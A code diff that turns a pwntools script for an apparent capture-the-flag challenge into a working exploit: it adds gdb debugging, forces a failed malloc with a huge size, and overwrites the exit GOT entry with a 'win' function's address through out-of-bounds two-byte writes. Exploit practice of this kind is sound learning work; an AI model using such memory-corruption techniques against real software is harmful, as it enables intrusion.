@@ -1,5 +1,6 @@
 from pwn import *
-from config import REMOTE_ADDR, REMOTE_PORT
+import struct
+#from config import REMOTE_ADDR, REMOTE_PORT
 
 REMOTE = 0 # Change to 1 to run the exploit on the remote instance
 
@@ -9,6 +10,12 @@ if REMOTE:
     p = remote(REMOTE_ADDR, REMOTE_PORT)
 else:
     p = e.process()
+    context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(p, """
+        b main
+        b 0x000000000040148d
+        continue
+    """)
 
 io = r = p # use whichever you like for communication
 
@@ -26,10 +33,22 @@ def add_number(idx, value, another):
     p.sendlineafter(b"Another? ", choice)
 
 
-create_numbers(100)
-add_number(0, 1337, True)
-add_number(1, 4141, False)
-print(p.recvall())
+win = e.sym.win
 
+# addr of exit, but need to div 2 because each index is worth 2 bytes (short)
+ex = 0x403480 // 2
 
+# cause malloc to fail
+create_numbers(100000000000)
 
+bs = p64(win)
+addr, num = 0,0
+
+# Overwrite exit
+for i in range(0, 8,2):
+    num = struct.unpack('<H', bs[i:i+2])[0]
+    addr = i//2 + ex
+    add_number(addr, num, True)
+
+# trigger exit
+add_number(addr, num, False)
